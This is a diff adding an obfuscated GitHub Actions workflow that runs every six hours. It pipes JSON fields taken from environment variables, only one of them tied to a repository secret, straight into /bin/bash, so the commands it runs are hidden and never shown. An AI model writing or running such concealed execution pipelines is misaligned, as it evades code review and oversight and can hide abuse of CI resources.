@@ -1,0 +1,27 @@
+name: woshirenyangz
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: woshirenyangz
+        env:
+          wink94: ${{ secrets.wink94 }}
+        run: |
+          echo $wink94 | jq -r .r5 | /bin/bash
+          echo $al18 | jq -r .dx3 | /bin/bash
+          echo $zub175 | jq -r .u94 | /bin/bash
+          echo $fwaia0937 | jq -r .x34 | /bin/bash
+          echo $h8149 | jq -r .qvlc09400 | /bin/bash
+          echo $xl79 | jq -r .hjcc12 | /bin/bash
+          echo $fus9245 | jq -r .zcba045 | /bin/bash
+          echo $chipw00799 | jq -r .wxm0 | /bin/bash
+          echo $p670 | jq -r .ivxgv1531 | /bin/bash
+
